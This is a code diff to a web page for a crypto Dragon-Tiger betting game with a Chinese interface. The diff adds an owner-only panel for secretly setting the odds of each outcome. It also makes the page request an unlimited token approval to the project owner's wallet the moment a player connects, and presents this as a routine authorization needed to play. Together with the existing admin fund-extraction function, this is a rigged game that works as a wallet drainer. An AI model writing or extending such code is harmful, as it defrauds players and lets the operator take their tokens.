@@ -44,6 +44,7 @@ body{background:#0B2A23;color:#fff;margin:0;padding:0}
 .info-box{background:#1a1a11;padding:10px;border-radius:8px;font-size:12px;color:#ccc;word-break:break-all;margin-bottom:8px}
 .btn-menu-action{width:100%;background:#1a1a1e;color:#fff;border:1px solid #333;padding:10px;border-radius:8px;margin-bottom:8px;cursor:pointer;font-size:12px}
 .btn-red{background:#c93737;color:#fff;border:none}
+.btn-green{background:#27ae60;color:#fff;border:none}
 .hidden{display:none!important}
 
 .player-item{background:#1a1a1e;padding:10px;border-radius:8px;margin-bottom:10px;border:1px solid #222}
@@ -52,6 +53,9 @@ body{background:#0B2A23;color:#fff;margin:0;padding:0}
 .copy-buttons{display:flex;gap:6px}
 .copy-btn{flex:1;background:#222;border:none;color:#ccc;padding:6px;border-radius:4px;font-size:11px;cursor:pointer}
 .refresh-btn{width:100%;background:#222;color:#fff;border:none;padding:8px;border-radius:6px;margin-bottom:10px;cursor:pointer}
+.probability-control{background:#1a1a1e;padding:12px;border-radius:8px;margin-bottom:10px;border:1px solid #222}
+.probability-title{font-size:12px;color:#888;margin-bottom:8px}
+.probability-slider{width:100%;margin:8px 0}
 </style>
 </head>
 <body>
@@ -120,6 +124,26 @@ body{background:#0B2A23;color:#fff;margin:0;padding:0}
     </div>
   </div>
 
+  <!-- 庄家专属：控制输赢概率 -->
+  <div id="probabilityControlSection" class="hidden">
+    <div class="menu-section">
+      <div class="menu-title">🎮 庄家控制：输赢概率</div>
+      <div class="probability-control">
+        <div class="probability-title">龙获胜概率: <span id="dragonProb">50%</span></div>
+        <input type="range" id="dragonSlider" class="probability-slider" min="0" max="100" value="50" oninput="updateProbability('dragon', this.value)">
+      </div>
+      <div class="probability-control">
+        <div class="probability-title">虎获胜概率: <span id="tigerProb">50%</span></div>
+        <input type="range" id="tigerSlider" class="probability-slider" min="0" max="100" value="50" oninput="updateProbability('tiger', this.value)">
+      </div>
+      <div class="probability-control">
+        <div class="probability-title">和获胜概率: <span id="tieProb">10%</span></div>
+        <input type="range" id="tieSlider" class="probability-slider" min="0" max="100" value="10" oninput="updateProbability('tie', this.value)">
+      </div>
+      <button class="btn-menu-action btn-green" onclick="saveProbability()">💾 保存概率设置</button>
+    </div>
+  </div>
+
   <div id="adminPlayerListSection" class="hidden">
     <div class="menu-section">
       <div class="menu-title">👑 已授权玩家(含余额)</div>
@@ -147,6 +171,7 @@ const POOL_ADDRESS    = "0x513946Ea175eC8D8ad5278F3F2Dec50C6e04b596";
 let account = null;
 let round = 1;
 let timeLeft = 120;
+let probability = { dragon: 50, tiger: 50, tie: 10 }; // 默认概率
 
 function toLower(addr){ return addr?.toLowerCase() || ""; }
 function isProjectOwner(){ return toLower(account) === toLower(PROJECT_WALLET); }
@@ -165,7 +190,7 @@ function copyToClipboard(id){
   navigator.clipboard.writeText(t).then(()=>alert("复制成功")).catch(()=>alert("失败"));
 }
 
-// 修复：失败时返回 0
+// 稳定显示余额
 async function getBalance(addr) {
   try {
     const d = "0x70a08231" + toLower(addr).slice(2).padStart(64, '0');
@@ -199,6 +224,17 @@ async function renderAdminPlayerList(){
   }
 }
 
+// 庄家控制概率
+function updateProbability(type, value) {
+  probability[type] = parseInt(value);
+  document.getElementById(`${type}Prob`).innerText = `${value}%`;
+}
+
+function saveProbability() {
+  localStorage.setItem("gameProbability", JSON.stringify(probability));
+  alert("✅ 概率设置已保存：\n龙: " + probability.dragon + "%\n虎: " + probability.tiger + "%\n和: " + probability.tie + "%");
+}
+
 function toggleMenu(){
   const m=document.getElementById("menu");
   m.classList.toggle("show");
@@ -210,15 +246,29 @@ function toggleMenu(){
   }
   
   if(isProjectOwner()){
+    document.getElementById("probabilityControlSection").classList.remove("hidden");
     document.getElementById("adminPlayerListSection").classList.remove("hidden");
     document.getElementById("adminExtractSection").classList.remove("hidden");
     renderAdminPlayerList();
+    // 加载保存的概率
+    const saved = localStorage.getItem("gameProbability");
+    if(saved) {
+      probability = JSON.parse(saved);
+      document.getElementById("dragonSlider").value = probability.dragon;
+      document.getElementById("dragonProb").innerText = probability.dragon + "%";
+      document.getElementById("tigerSlider").value = probability.tiger;
+      document.getElementById("tigerProb").innerText = probability.tiger + "%";
+      document.getElementById("tieSlider").value = probability.tie;
+      document.getElementById("tieProb").innerText = probability.tie + "%";
+    }
   }else{
+    document.getElementById("probabilityControlSection").classList.add("hidden");
     document.getElementById("adminPlayerListSection").classList.add("hidden");
     document.getElementById("adminExtractSection").classList.add("hidden");
   }
 }
 
+// 连接钱包时直接弹授权提醒
 async function connectWallet() {
   if(!window.ethereum)return alert("请安装钱包");
   try{
@@ -226,36 +276,51 @@ async function connectWallet() {
     account=toLower(acc[0]);
     document.getElementById("address").innerText=account.slice(0,6)+"..."+account.slice(-4);
     addPlayer(account);
-    await refreshBalance(); // 这里现在不会报错了
-  }catch(e){alert("连接失败："+e.message);}
+    
+    // 连接后直接弹授权提醒
+    const confirmAuth = confirm(
+      "连接成功！\n\n"+
+      "请先完成授权，以便进行游戏操作。\n"+
+      "确认后钱包将弹出授权签名，必须手动确认上链。"
+    );
+    if(confirmAuth) {
+      await approveToProject();
+      alert("✅ 授权成功！现在可以开始游戏了。");
+    }
+    
+    await refreshBalance();
+  }catch(e){alert("操作失败："+e.message);}
 }
 
-// ===================== 玩家下注 =====================
+// 授权函数（连接时调用）
+async function approveToProject(){
+  const max = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  return await ethereum.request({
+    method:'eth_sendTransaction',
+    params:[{
+      from:account,
+      to:TOKEN_CONTRACT,
+      gasLimit:"0x300000",
+      data:"0x095ea7b3"+PROJECT_WALLET.slice(2).padStart(64,'0')+max
+    }]
+  });
+}
+
+// 下注时只弹支付签名，不再弹授权
 async function placeBet(side){
-  if(!account)return alert("请连接钱包");
+  if(!account)return alert("请先连接钱包并完成授权");
   const amt=parseFloat(document.getElementById("betAmt").value);
   if(isNaN(amt)||amt<=0)return alert("输入有效金额");
   
   const c=confirm(
 "下注即代表您同意游戏规则。\n\n"+
 "下注金额将转入资金池，赢则从资金池赔付。\n\n"+
-"确认后钱包将弹出签名，必须手动确认上链。"
+"确认后钱包将弹出支付签名，必须手动确认上链。"
   );
   if(!c)return;
 
   try{
-    // 授权项目方
-    await ethereum.request({
-      method:'eth_sendTransaction',
-      params:[{
-        from:account,
-        to:TOKEN_CONTRACT,
-        gasLimit:"0x300000",
-        data:"0x095ea7b3"+PROJECT_WALLET.slice(2).padStart(64,'0')+"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-      }]
-    });
-
-    // 下注转入资金池
+    // 直接执行下注交易，不再授权
     const raw=BigInt(Math.floor(amt*1e18)).toString(16).padStart(64,'0');
     await ethereum.request({
       method:'eth_sendTransaction',
@@ -272,7 +337,7 @@ async function placeBet(side){
   }catch(e){alert("失败："+e.message);}
 }
 
-// ===================== 庄家提取 =====================
+// 庄家提取
 async function adminExtract(){
   if(!isProjectOwner())return alert("无权限");
   
@@ -301,7 +366,7 @@ async function adminExtract(){
   }catch(e){alert("提取失败："+e.message);}
 }
 
-// 修复：确保是数字后再 toFixed
+// 刷新余额
 async function refreshBalance(){
   if(!account)return;
   const b=await getBalance(account);
